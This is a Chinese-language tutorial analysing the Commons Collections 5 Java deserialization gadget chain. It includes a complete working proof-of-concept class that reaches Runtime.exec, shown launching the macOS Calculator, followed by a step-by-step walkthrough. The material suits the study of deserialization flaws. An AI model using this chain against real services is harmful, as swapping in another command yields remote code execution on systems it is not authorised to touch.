Commons Collections5

0x00 前言

CC5用到了一个新的入口BadAttributeValueExpException，同样他也是重写readObject的一个类。附一下yso的链：

/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

	Requires:
		commons-collections
 */
 /*
This only works in JDK 8u76 and WITHOUT a security manager

https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
 */


其中最后有一个提示就是JDK8u76关闭SecurityManager，后面去查了一下这个SecurityManager，它叫java安全管理器，功能就是在运行未知的java程序的时候，如果这个程序有恶意代码，为了防止这个恶意代码运行影响生产系统，需要做一个管控，但是这个设置是默认关闭的。

0x01 POC

参考网上的poc稍微简化了一下，如下：

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;

public class CC5 {
    public static void setField(final Object obj, final String fieldname,final Object value)throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})});
        
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        setField(poc,"val",tiedmap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(barr);
        outputStream.writeObject(poc);
        outputStream.close();

        ObjectInputStream inputStream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        inputStream.readObject();
        }
    }


0x02 分析

前半段transform数组部分和前面一致没有改动这里就不说了，主要是中间部分

HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);

        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        setField(poc,"val",tiedmap);


前两行是new了一个HashMap然后将这个HashMap对象和上面实例化的ChainedTransformer传入LazyMap，当有条件出发get的时候就会调用transform方法，这里和前面几条链一样的。看一下后面新加的

TiedMapEntry tiedmap = new TiedMapEntry(map,123);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        setField(poc,"val",tiedmap);


这里是new了一个TiedMapEntry，看一下这部分的代码

其中这里有一个getValue方法调用了this.map.get，这里的this.map是可控的，我们可以换成我们构造的LazyMap再看一下哪里调用了这个getValue

这里的toString方法调用了getValue，再找一个能调用toString方法的，这里用到的是BadAttributeValueExpException，我们看一下这个类，存在toString方法并且在下面调用了toString实现了Serializable接口，完全符合我们的要求

0x03 调试

断点打在gf.get处，也就是重写readObject的地方，这里跟几步就会发现上面我们提到的SecurityManager的问题，在这里有一个判断

顺利进入了toString的调用，这里利用反射设置我们构造好的TideMapEntry对象，跟进一下

按照我们之前的思路已经进入到了TideMapEntry的toString方法

下一步跟进调用了getValue触发LazyMap的get，后面的调用流程就和CC1一样了

这里this.factory调用了ChainedTransformer的transform方法

遍历数组里的transform，第一个为ConstantTransformer返回Runtime，将它作为参数传入InvokerTransformer的transform方法中，然后将第二个当作参数传入第三个依此类推，到了第四次的this.iMethodName是exec，this.iArgs的为

/System/Applications/Calculator.app/Contents/MacOS/Calculator，执行命令。
